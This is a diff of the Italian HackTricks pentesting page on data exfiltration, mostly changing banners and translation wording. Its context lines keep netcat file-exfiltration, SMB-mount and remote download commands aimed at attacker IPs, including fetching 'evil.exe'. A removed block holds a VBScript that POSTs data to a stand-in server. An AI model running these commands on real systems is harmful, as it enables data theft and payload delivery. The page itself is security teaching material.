@@ -1,18 +1,19 @@
 # Esfiltrazione
 
+{% hint style="success" %}
+Impara e pratica l'Hacking su AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Impara l'hacking su AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Sostieni HackTricks</summary>
 
-Altri modi per supportare HackTricks:
-
-* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 **Try Hard Security Group**
 
@@ -185,17 +186,7 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-# Esfiltrazione su Windows
-
-Esistono diverse tecniche per esfiltrare dati da un sistema Windows compromesso. Alcuni metodi comuni includono:
-
-1. **Utilizzo di protocolli di rete**: trasferire dati attraverso protocolli di rete come HTTP, HTTPS, DNS o FTP.
-2. **Utilizzo di servizi cloud**: caricare i dati su servizi cloud come Dropbox, Google Drive o OneDrive.
-3. **Utilizzo di tunneling**: creare tunnel crittografati per inviare dati a un server remoto.
-4. **Utilizzo di steganografia**: nascondere i dati all'interno di file multimediali o altri file per esfiltrarli in modo discreto.
-5. **Utilizzo di dispositivi di archiviazione rimovibili**: copiare i dati su dispositivi USB o altri dispositivi di archiviazione rimovibili.
-
-È importante considerare il rischio di rilevamento durante il processo di esfiltrazione e scegliere il metodo più appropriato in base all'ambiente e agli obiettivi dell'attaccante.
+Windows
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -219,7 +210,9 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-Netcat è uno strumento versatile per l'interazione di rete che consente la lettura e la scrittura di dati su connessioni di rete utilizzando il protocollo TCP o UDP. Può essere utilizzato per trasferire file, creare backdoor, eseguire shell remote e molto altro.
+### Netcat
+
+Netcat is a versatile networking utility that can be used for reading from and writing to network connections using TCP or UDP. It can be used to transfer files, port scanning, banner grabbing, and as a backdoor. Netcat can be used as a simple chat client as well.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -266,7 +259,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Per impostazione predefinita in XP e 2003 (in altri sistemi operativi deve essere aggiunto esplicitamente durante l'installazione)
+Per impostazione predefinita in XP e 2003 (in altri sistemi deve essere aggiunto esplicitamente durante l'installazione)
 
 In Kali, **avvia il server TFTP**:
 ```bash
@@ -291,19 +284,6 @@ Scarica un file con un PHP oneliner:
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
 ## VBScript
-
-VBScript (Visual Basic Scripting Edition) è un linguaggio di scripting sviluppato da Microsoft che è spesso utilizzato per automatizzare attività all'interno di sistemi Windows. È possibile utilizzare VBScript per eseguire operazioni di esfiltrazione di dati, come ad esempio inviare informazioni sensibili a un server remoto. Ecco un esempio di codice VBScript che illustra come eseguire l'esfiltrazione di dati:
-
-```vbs
-Dim objXMLHTTP
-Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
-objXMLHTTP.open "POST", "http://www.example.com/data_receiver", False
-objXMLHTTP.setRequestHeader "Content-type", "application/x-www-form-urlencoded"
-objXMLHTTP.send "data=exfiltrated_data"
-Set objXMLHTTP = Nothing
-```
-
-In questo esempio, il codice VBScript crea un oggetto `MSXML2.ServerXMLHTTP` per inviare i dati esfiltrati a un server remoto tramite una richiesta POST. È importante notare che l'utilizzo di VBScript per scopi di esfiltrazione di dati può essere considerato un comportamento dannoso e potenzialmente illegale senza il consenso esplicito del proprietario del sistema.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -341,7 +321,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Il programma `debug.exe` non solo consente l'ispezione dei file binari ma ha anche la **capacità di ricostruirli da esadecimale**. Ciò significa che fornendo un esadecimale di un file binario, `debug.exe` può generare il file binario. Tuttavia, è importante notare che debug.exe ha una **limitazione nell'assemblare file fino a 64 kb in dimensione**.
+Il programma `debug.exe` non solo consente l'ispezione dei file binari ma ha anche la **capacità di ricostruirli da esadecimale**. Ciò significa che fornendo un esadecimale di un file binario, `debug.exe` può generare il file binario. Tuttavia, è importante notare che debug.exe ha una **limitazione nell'assemblare file fino a 64 kb di dimensione**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -361,16 +341,17 @@ Quindi copia-incolla il testo nella shell di Windows e verrà creato un file chi
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
+{% hint style="success" %}
+Impara e pratica l'Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica l'Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Supporta HackTricks</summary>
 
-Altri modi per supportare HackTricks:
-
-* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.
+* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
